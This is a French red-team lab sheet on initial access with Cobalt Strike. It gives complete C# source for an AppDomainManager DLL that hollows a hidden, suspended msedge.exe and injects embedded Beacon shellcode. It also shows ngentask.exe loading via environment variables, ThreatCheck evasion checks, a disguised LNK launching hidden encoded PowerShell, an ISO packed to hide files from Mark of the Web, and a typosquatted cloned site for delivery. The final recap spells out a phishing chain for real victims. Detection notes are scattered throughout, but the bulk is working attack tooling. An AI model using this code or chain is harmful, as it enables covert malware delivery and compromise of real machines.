# Lab — Initial Access

> **Deux scénarios, un même lab.** Cette fiche distingue l’examen Assume Breach, avec une session Windows déjà accessible, de l’exercice de livraison à distance présenté dans le cours.

| Scénario | Situation | Objectif du cours |
|---|---|---|
| Examen — Assume Breach | Identifiants et accès à la workstation fournis | Préparer la DLL du lab et étudier son chargement avec `ngentask.exe` ; ni ISO, ni LNK, ni phishing requis |
| Livraison à distance | Aucun accès direct à la session cible | Comprendre les risques du document leurre, du raccourci LNK, du conteneur ISO et de la distribution web |

**Point essentiel :** la technique commune est le chargement d’une assembly via `AppDomainManager` et `ngentask.exe`, avec un scénario de Process Hollowing vers `msedge.exe`. Les étapes de livraison ne sont pas nécessaires dans la variante Assume Breach.

---

## Comprendre AppDomainManager Injection

**Principe :** sous .NET Framework, une classe dérivée de `AppDomainManager` peut intervenir pendant l’initialisation d’un domaine d’application. Le runtime peut la charger selon les paramètres d’environnement fournis ; dans un contexte non maîtrisé, cette fonctionnalité peut être détournée.

Le cours étudie une DLL .NET possédant une classe `AppDomainManager`, les variables `APPDOMAIN_MANAGER_TYPE` et `APPDOMAIN_MANAGER_ASM`, et le chargement de cette DLL depuis un exécutable .NET Framework.

### Pourquoi `ngentask.exe` ?

`ngentask.exe` est un binaire lié à .NET Framework. Le lab présente une version conservée dans le magasin de composants Windows `WinSxS`. Le comportement exact varie selon les versions de Windows et du runtime.

La signature numérique d’un exécutable Microsoft ne garantit pas que les assemblies chargées dans son contexte soient toutes légitimes.

### Pourquoi `msedge.exe` ?

Le scénario décrit un Beacon fonctionnant dans un processus Microsoft Edge. Il sert à étudier les relations parent-enfant, les écritures mémoire et les connexions réseau. Le fait qu’un navigateur puisse légitimement accéder à Internet ne garantit pas que son activité échappe aux contrôles EDR.

### Éléments OPSEC à contrôler

| Élément | Catégorie des notes | Télémétrie potentielle |
|---|---|---|
| `AppDomainHijack.dll` sur disque | CAUTION | Présence du fichier, analyse statique et ressources intégrées |
| `ngentask.exe` | SAFE dans les notes | Processus signé et chargements associés |
| Variables `APPDOMAIN_MANAGER_*` | SAFE dans les notes | Variables de session et chargement des assemblies |
| Process Hollowing vers `msedge.exe` | SAFE dans les notes | Écritures en mémoire et arborescence des processus |
| Communications depuis `msedge.exe` | SAFE dans les notes | Activité HTTP/S et journaux réseau |

Ces catégories OPSEC sont indicatives et **ne garantissent pas l’absence de détection**.

---

## Préparer le payload du lab

La préparation se déroule sur l’Attacker Desktop Windows. Le Malleable C2 Profile, l’Artifact Kit et le Resource Kit sont étudiés dans la fiche Defense Evasion.

### Générer le fichier binaire du Beacon

Dans Cobalt Strike, ouvrir **Payloads > Windows Stageless Payload**. Le lab présente le listener `http`, le format `Raw` et le fichier `C:\Payloads\http_x64.xprocess.bin`.

**Explication :** le format Raw produit des octets sans conteneur PE. Dans le scénario, ces données sont intégrées comme ressource à l’assembly .NET. Le suffixe `.xprocess.bin` est le nom choisi dans le lab.

<img src="/images/initial-access-lab-01.png" width=800>

### Préparer le dossier de travail

Créer le répertoire `C:\Payloads\deals\`, utilisé pour regrouper les fichiers d’exercice. Le reste de la fiche reprend ce chemin d’exemple.

### Créer le projet .NET Framework

Dans Visual Studio, créer une **Class Library (.NET Framework)** nommée `AppDomainHijack`, avec solution et projet dans le même répertoire.

**Pourquoi .NET Framework ?** Les variables `APPDOMAIN_MANAGER_*` concernées par l’exercice appartiennent au modèle de chargement .NET Framework. Elles ne sont pas équivalentes aux mécanismes des versions modernes de .NET.

<img src="/images/initial-access-lab-02.png" width=800>

### Ajouter le fichier en Embedded Resource

Dans Solution Explorer, sélectionner **Add > Existing Item**, choisir `C:\Payloads\http_x64.xprocess.bin`, puis définir **Build Action > Embedded Resource**.

**Explication :** les octets du fichier sont inclus dans les ressources de la DLL. Le code du lab les lit avec `Assembly.GetManifestResourceStream(...)`. Le nom de ressource doit correspondre au nom attendu dans le projet.

**Observation :** le fichier binaire inclus dans la DLL reste susceptible d’être contrôlé par Microsoft Defender et les outils d’analyse mémoire.

<img src="/images/initial-access-lab-03.png" width=800>

### Examiner le code `Class1.cs`

Le code suivant est celui du scénario de formation ; il est conservé pour référence.

    ```c
    using System;
    using System.IO;
    using System.Reflection;
    using System.Runtime.InteropServices;
      
    namespace AppDomainHijack
    {
        public sealed class DomainManager : AppDomainManager
        {
            public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
            {
                var si = new STARTUPINFOA
                {
                    cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
                    dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
                };
      
                // create hidden + suspended msedge process
                var success = CreateProcessA(
                    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                    "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                    IntPtr.Zero,
                    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
                    ref si,
                    out var pi);
      
                if (!success)
                    return;
      
                // get basic process information
                var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
                var lpPbi = Marshal.AllocHGlobal(szPbi);
      
                NtQueryInformationProcess(
                    pi.hProcess,
                    PROCESSINFOCLASS.ProcessBasicInformation,
                    lpPbi,
                    (uint)szPbi,
                    out _);
      
                // marshal data to structure
                var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
                Marshal.FreeHGlobal(lpPbi);
      
                // calculate pointer to image base address
                var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
      
                // buffer to hold data, 64-bit addresses are 8 bytes
                var bImageBaseAddress = new byte[8];
      
                // read data from spawned process
                ReadProcessMemory(
                    pi.hProcess,
                    lpImageBaseAddress,
                    bImageBaseAddress,
                    8,
                    out _);
      
                // convert address bytes to pointer
                var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
      
                // read pe headers
                var data = new byte[512];
      
                ReadProcessMemory(
                    pi.hProcess,
                    baseAddress,
                    data,
                    512,
                    out _);
      
                // read e_lfanew
                var e_lfanew = BitConverter.ToInt32(data, 0x3C);
      
                // calculate rva
                var rvaOffset = e_lfanew + 0x28;
                var rva = BitConverter.ToUInt32(data, rvaOffset);
      
                // calculate address of entry point
                var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
      
                // read the shellcode
                byte[ ] shellcode;
      
                var assembly = Assembly.GetExecutingAssembly();
      
                using (var rs = assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin"))
                {
                    // convert stream to raw byte[ ]
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        shellcode = ms.ToArray();
                    }
                }
      
                // copy shellcode into address of entry point
                WriteProcessMemory(
                    pi.hProcess,
                    lpEntryPoint,
                    shellcode,
                    shellcode.Length,
                    out _);
      
                // resume process
                ResumeThread(pi.hThread);
            }
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool CreateProcessA(
                string applicationName,
                string commandLine,
                IntPtr processAttributes,
                IntPtr threadAttributes,
                bool inheritHandles,
                PROCESS_CREATION_FLAGS creationFlags,
                IntPtr environment,
                string currentDirectory,
                ref STARTUPINFOA startupInfo,
                out PROCESS_INFORMATION processInformation);
      
            [DllImport("ntdll.dll", ExactSpelling = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern uint NtQueryInformationProcess(
                IntPtr processHandle,
                PROCESSINFOCLASS processInformationClass,
                IntPtr processInformation,
                uint processInformationLength,
                out uint returnLength);
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool ReadProcessMemory(
                IntPtr processHandle,
                IntPtr baseAddress,
                byte[ ] buffer,
                UInt64 size,
                out uint numberOfBytesRead);
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern bool WriteProcessMemory(
                IntPtr processHandle,
                IntPtr baseAddress,
                byte[ ] buffer,
                int size,
                out int numberOfBytesWritten);
      
            [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
            [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
            private static extern uint ResumeThread(IntPtr threadHandle);
        }
      
        [Flags]
        public enum PROCESS_CREATION_FLAGS : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_SECURE_PROCESS = 0x00400000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
        }
      
        public struct STARTUPINFOA
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public STARTUPINFO_FLAGS dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
      
        [Flags]
        public enum STARTUPINFO_FLAGS : uint
        {
            STARTF_FORCEONFEEDBACK = 0x00000040,
            STARTF_FORCEOFFFEEDBACK = 0x00000080,
            STARTF_PREVENTPINNING = 0x00002000,
            STARTF_RUNFULLSCREEN = 0x00000020,
            STARTF_TITLEISAPPID = 0x00001000,
            STARTF_TITLEISLINKNAME = 0x00000800,
            STARTF_UNTRUSTEDSOURCE = 0x00008000,
            STARTF_USECOUNTCHARS = 0x00000008,
            STARTF_USEFILLATTRIBUTE = 0x00000010,
            STARTF_USEHOTKEY = 0x00000200,
            STARTF_USEPOSITION = 0x00000004,
            STARTF_USESHOWWINDOW = 0x00000001,
            STARTF_USESIZE = 0x00000002,
            STARTF_USESTDHANDLES = 0x00000100
        }
      
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
      
        public enum PROCESSINFOCLASS
        {
            ProcessBasicInformation = 0
        }
      
        public struct PROCESS_BASIC_INFORMATION
        {
            public uint ExitStatus;
            public IntPtr PebBaseAddress;
            public ulong AffinityMask;
            public int BasePriority;
            public ulong UniqueProcessId;
            public ulong InheritedFromUniqueProcessId;
        }
    }
    ```

> **Lecture du code :** la classe `DomainManager` hérite de `AppDomainManager`. Le runtime .NET peut appeler `InitializeNewDomain()` au démarrage du processus hôte, avant l’exécution normale du programme.
>
> **Partie 1 — Création d’un processus Edge suspendu :**

> ```
> CreateProcessA(msedge.exe, CREATE_SUSPENDED | CREATE_NO_WINDOW, ...)
> ```

> Le lab utilise `CREATE_SUSPENDED` pour créer le thread principal sans démarrer son exécution, ainsi que `CREATE_NO_WINDOW` pour éviter l’ouverture d’une fenêtre. Ces indicateurs et la création du processus peuvent être visibles dans la télémétrie système.
>
> **Partie 2 — Lecture des structures du processus :**

> ```
> NtQueryInformationProcess → read PEB → read image base → read PE headers → calculate entry point
> ```

> Le **PEB (Process Environment Block)** contient notamment des informations sur l’exécutable chargé. L’exemple analyse les en-têtes PE, dont `ImageBaseAddress`, `e_lfanew` et `AddressOfEntryPoint`. Il illustre la différence entre une adresse relative RVA et une adresse virtuelle absolue.
>
> **Partie 3 — Lecture de la ressource intégrée à la DLL :**

> ```
> Assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin")
> ```

> Le code lit les données binaires placées dans les ressources de l’assembly et les stocke dans un tableau `byte[]`. Une ressource intégrée reste présente dans le fichier DLL et peut être inspectée.
>
> **Partie 4 — Écriture dans la mémoire du processus :**

> ```
> WriteProcessMemory(pi.hProcess, lpEntryPoint, shellcode, ...)
> ```

> Cette partie illustre le principe du **Process Hollowing** : le code présent au point d’entrée d’un processus suspendu est remplacé, ce qui change son comportement à la reprise du thread.
>
> **Partie 5 — Reprise du thread :**

> ```
> ResumeThread(pi.hThread)
> ```

> Le thread suspendu est repris dans le scénario. Le cours présente ensuite une nouvelle session Beacon associée à `msedge.exe` et au team server Cobalt Strike.
>
> **Observation OPSEC :** les appels mémoire comme `WriteProcessMemory`, la création de processus et la modification de leur mémoire sont surveillables par les EDR. L’utilisation d’un exécutable Microsoft signé ne garantit pas l’absence de détection.
>
> **Référence du cours :** Process Hollowing, chapitre *Malware Essentials*.

### Compiler et vérifier la DLL

Dans Visual Studio, compiler le projet en mode **Release**. Le chemin de sortie présenté est :

`C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll`

**Vérification :** un chemin de sortie contenant `net8.0` peut indiquer qu’un projet .NET moderne a été choisi au lieu de la Class Library .NET Framework attendue.

Examiner ensuite la DLL générée avec ThreatCheck, selon les outils du lab :

> ```cmd
> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll"
> ```

> **Interprétation du résultat :** une alerte ThreatCheck signale une correspondance avec certaines signatures utilisées par le moteur de test. L’absence d’alerte ne permet pas d’affirmer que le fichier ne sera pas détecté par d’autres contrôles.
>
> Le cours compare les octets du payload et les paramètres du Malleable C2 Profile lorsqu’un résultat de détection est observé.

### Conserver la DLL dans le dossier du lab

Le bloc suivant reprend le transfert du fichier de l’exercice vers le dossier `deals` :

	```Terminal-nocolor
	cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\deals\
	```

---

## NGenTask — Chargement avec .NET Framework

### Comprendre le rôle de `ngentask.exe`

`ngentask.exe` appartient aux outils .NET Framework de Microsoft. Le magasin `WinSxS` peut conserver plusieurs versions des composants Windows pour assurer la compatibilité.

Le scénario étudie la réaction du runtime lorsque les variables `APPDOMAIN_MANAGER_TYPE` et `APPDOMAIN_MANAGER_ASM` désignent une classe de type `AppDomainManager`. Le cours illustre notamment l’appel à `InitializeNewDomain()`.

**Observation :** un exécutable signé peut charger des assemblies supplémentaires. Les contrôles de sécurité doivent donc examiner les modules, les variables d’environnement et les appels mémoire associés, et pas seulement la signature du processus.

La commande suivante concerne la copie de la version `WinSxS` utilisée dans le lab.

	```Terminal-nocolor
    cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Payloads\deals\
    ```

> **Pourquoi ce répertoire ?** Le dossier `C:\Payloads\deals\` sert de point de regroupement des fichiers du scénario. Le comportement de chargement de l’assembly dépend notamment de son identité et des chemins accessibles au runtime.

### Vérifier le comportement sur la workstation du lab

Cette vérification correspond à l’environnement **Assume Breach** : les identifiants et la session de test sont déjà disponibles. Les étapes du document leurre, du raccourci LNK et de l’ISO ne sont pas requises pour cette partie.

1. Se connecter au team server Cobalt Strike.
2. Ouvrir le dossier de l’exercice et examiner les deux variables d’environnement `APPDOMAIN_MANAGER_*`.

	```PowerShell-linenums
    cd C:\Payloads\deals
    $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
    $env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
    ```

> **Variables d’environnement :**
>
> - `APPDOMAIN_MANAGER_TYPE` désigne le nom complet de la classe .NET (exemple : `AppDomainHijack.DomainManager`).
> - `APPDOMAIN_MANAGER_ASM` désigne l’identité de l’assembly, avec son nom, sa version, sa culture et son `PublicKeyToken`.
>
> Ces paramètres sont associés à l’environnement de la session concernée ; ils ne sont pas nécessairement écrits dans le Registry ou conservés après la fermeture du processus.
>
> Dans le scénario, le runtime .NET Framework lit ces valeurs pendant le démarrage de `ngentask.exe`.

<img src="/images/initial-access-lab-04.png" width=800>

3. Dans la session du lab, exécuter `.\ngentask.exe`.
4. Vérifier si une nouvelle connexion Beacon est visible dans Cobalt Strike.

**Contrôles de la session :** examiner l’identité du compte avec `getuid` et le processus hôte avec `process_browser`, puis comparer les résultats aux attentes du lab.

> ```cs
> beacon> getuid          // confirm running as the expected user
> beacon> process_browser // GUI tab — confirm beacon PID is inside msedge.exe, check for EDR processes
> ```

> **Dépannage :** en l’absence de connexion, vérifier que le listener HTTP du lab est actif, que le Malleable C2 Profile a bien été chargé et que les fichiers du scénario se trouvent dans le répertoire attendu.

---

## Partie complémentaire — Livraison à distance

**Cette partie n’est pas nécessaire dans le scénario d’examen Assume Breach.** Les sections suivantes décrivent un exercice pédagogique portant sur les leurres et sur la façon dont les mécanismes de sécurité de Windows peuvent être sollicités lors d’une livraison à distance.

### Document leurre (Decoy)

**Principe :** un document Office réel peut être associé à un raccourci. Le lab utilise un classeur Excel `deals.xlsx` pour illustrer ce que voit l’utilisateur, en parallèle des opérations effectuées par le raccourci.

**Observation de sécurité :** un document sans macros n’implique pas que les éléments qui le lancent soient légitimes. Les associations de fichiers, raccourcis et commandes parent-enfant doivent être examinés séparément.

1. Créer un classeur de démonstration dans Excel.
2. Utiliser les données fictives de l’exercice pour reconnaître le document.
3. Le cours mentionne aussi l’outil Office `OSPPREARM.EXE` dans le contexte de son environnement de lab.

    ```xlsx-nocolor
    id  product      discount  code
    1   Prodder      56%       54473-150
    2   Viva         9%        0378-5713
    3   Aerified     22%       43742-0187
    4   Zaam-Dox     26%       35356-687
    5   Rank         41%       63323-300
    6   Pannier      61%       50804-302
    7   Wrapsafe     32%       67046-223
    8   Voltsillam   58%       55910-721
    9   Ventosanzap  4%        0485-0051
    10  Otcom        54%       36987-2281
    ```

1. Enregistrer le classeur de démonstration sous `C:\Payloads\deals\deals.xlsx`, puis fermer Excel.

<img src="/images/initial-access-lab-05.png" width=860>

---

## Raccourci LNK — Comprendre le déclencheur

**Principe :** un fichier `.lnk` est un raccourci Windows et non un document Office. Le nom et l’icône affichés peuvent différer de la véritable action exécutée.

Le lab montre un raccourci associé à un fichier Excel, avec une chaîne de processus comprenant `Explorer.exe`, `cmd.exe`, `powershell.exe` et `ngentask.exe`. Dans le scénario, le raccourci ouvre le document de démonstration et déclenche également d’autres opérations.

**Points de détection :**
- Une commande PowerShell encodée avec `-enc` peut être un signal d’alerte.
- La présence de `powershell.exe` et `ngentask.exe` dans la même chaîne parent-enfant mérite d’être examinée.
- L’icône d’un fichier n’est pas une preuve de son type réel.

Le bloc suivant est la commande PowerShell d’exemple reproduite depuis le lab.

    ```PowerShell-linenums
    cd C:\Payloads\deals\
    $cmd = '$env:APPDOMAIN_MANAGER_TYPE = "AppDomainHijack.DomainManager"; $env:APPDOMAIN_MANAGER_ASM = "AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"; .\ngentask.exe'
    $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
    ```

> **Lecture du code :** la variable `$cmd` contient une commande, puis `$enc` stocke sa représentation en Base64. Pour l’option PowerShell `-enc`, le contenu est encodé selon le format UTF-16LE.
>
> Un encodage Base64 ne constitue pas une mesure de chiffrement. Le contenu peut être décodé et analysé.

### Examiner les propriétés du raccourci

Le bloc suivant illustre la structure d’un raccourci Windows construit avec l’interface COM `WScript.Shell`.

    ```PowerShell-linenums
    $wsh = New-Object -ComObject WScript.Shell
    $lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
    $lnk.TargetPath = "%COMSPEC%"
    $lnk.Arguments = "/C start deals.xlsx && %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc $enc"
    $lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
    $lnk.Save()
    ```

> **Propriétés du fichier LNK :**
>
> - `TargetPath` définit le programme cible du raccourci.
> - `Arguments` contient les paramètres transmis au programme.
> - `IconLocation` indique l’icône affichée dans Explorer.
>
> Pour le contrôle de sécurité, ces champs doivent être analysés conjointement. Une icône Excel peut représenter un raccourci exécutant un autre programme.

<img src="/images/initial-access-lab-trigger.png" width=1024>

### Vérification dans l’environnement de formation

Le cours présente le fichier `deals.xlsx.lnk` et le classeur de démonstration. La validation du lab repose sur l’observation du document et de la nouvelle session Cobalt Strike.

<img src="/images/initial-access-lab-06.png" width=1024>

---

## Conteneur ISO — Étudier Mark of the Web

**Mark of the Web (MotW)** repose notamment sur la zone de provenance associée aux fichiers Windows, par exemple le flux `Zone.Identifier` sur NTFS. Ce marquage peut influencer les avertissements SmartScreen et le comportement de Protected View dans Office.

Le lab compare le comportement des fichiers récupérés directement et de ceux contenus dans une image ISO. La propagation de MotW dépend aussi de la version de Windows, des correctifs et du mécanisme d’extraction ; il ne faut pas considérer son absence comme garantie.

Le paramètre `-H` de l’outil PackMyPayload est présenté dans les notes comme un mécanisme de gestion de la visibilité des fichiers dans l’image de l’exercice.

### Examiner l’archive du lab

Le bloc suivant indique la commande PackMyPayload utilisée par le cours pour produire le fichier `deals.iso`.

    ```ubuntu-nocolor
    python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,ngentask.exe,AppDomainHijack.dll /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso
    ```

> **Éléments de la commande :**
>
> - `PackMyPayload.py` est l’outil de création d’images ou d’archives.
> - L’option `-H` prend une liste de fichiers dans le scénario.
> - `/mnt/c/Payloads/deals/` correspond au répertoire source.
> - `/mnt/c/Payloads/deals/deals.iso` désigne le fichier de sortie.
>
> Lors de l’analyse d’une archive provenant d’une source non fiable, il faut examiner les raccourcis, les fichiers intégrés et les mécanismes d’exécution qu’elle contient.

### Vérifier le contenu de l’ISO dans le lab

Les supports présentent le montage de `deals.iso` et l’observation des éléments visibles dans Explorer.

<img src="/images/initial-access-lab-07.png" width=1024>

---

## Livraison web — Comprendre le scénario

Cette section illustre un dispositif de **distribution de fichier** et de **clonage de page** dans l’environnement d’exercice Cobalt Strike. Elle vise à comprendre les risques associés aux pages de téléchargement imitant un site réel.

Deux fonctions de Site Management sont présentées :

1. **Host File** : met un fichier à disposition sous une URI.
2. **Clone Site** : crée une copie locale d’une page web pour l’environnement d’entraînement.

Le lab utilise notamment les valeurs `/deals.iso`, `/deals`, `deals.bleepingcomputer.com` et `www.bleepincomputer.com`. Ces chaînes appartiennent à son exemple et ne prouvent pas qu’une page est légitime.

**Signaux à vérifier :** incohérences de domaine, protocole HTTP/S, comportement de téléchargement, en-têtes `Host` et scripts exécutés depuis une page. Le clonage d’un site peut être incomplet, notamment pour certains fichiers JavaScript et CSS.

### Hébergement présenté dans Cobalt Strike

Les notes illustrent **Site Management > Host File**, puis la fonction **Clone Site**. Les valeurs et chemins de l’exercice restent les suivants :

- Fichier : `C:\Payloads\deals\deals.iso`
- URI du fichier : `/deals.iso`
- URI de la page : `/deals`
- Nom d’hôte du lab : `www.bleepincomputer.com`
- Page de référence : `https://deals.bleepingcomputer.com`

<img src="/images/initial-access-lab-08.png" width=1024>

### Observer le résultat dans le lab

Le scénario final présente les étapes d’accès à la page de démonstration, le fichier téléchargé, son ouverture, puis le résultat visible dans la console Cobalt Strike. Il rappelle la différence entre l’apparence d’un document et la chaîne de programmes réellement lancés.

**Bilan :** AppDomainManager, fichiers LNK, MotW, ISO et clonage web constituent des sujets d’analyse distincts. L’étape de phishing reste **hors du parcours Assume Breach**.

---

## Récapitulatif de l’examen — Scénario Assume Breach

```
EXAM (assume-breach — direct workstation access):
─────────────────────────────────────────────────
On attacker Windows dev box:
  1. Generate raw shellcode → CS → Payloads → Windows Stageless Payload → Raw → http_x64.xprocess.bin
  2. Build AppDomainHijack.dll in VS (Release, .NET Framework)
  3. C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f AppDomainHijack.dll  → must be clean
  4. Copy AppDomainHijack.dll to delivery location (CS web server or USB/share)
  5. Copy ngentask.exe from WinSxS to same location

On exam foothold workstation (logged in with provided creds):
  6. Copy AppDomainHijack.dll and ngentask.exe to a working directory (e.g. C:\Windows\Temp\)
  7. Open PowerShell
  8. cd to the directory containing both files
  9. $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
     $env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
  10. .\ngentask.exe
  11. Beacon checks in from msedge.exe → confirm getuid, ps

REAL ENGAGEMENT (phishing — no direct access):
───────────────────────────────────────────────
Steps 1–5 above PLUS:
  6. Create decoy (deals.xlsx)
  7. Build LNK trigger (deals.xlsx.lnk with cmd→powershell→ngentask chain)
  8. PackMyPayload → ISO (hide DLL, ngentask, xlsx — show only LNK)
  9. CS Site Management → Host ISO → Clone legitimate site with ISO as attack payload
  10. Social engineer victim to visit URL → ISO downloads → victim mounts + clicks LNK → beacon
```
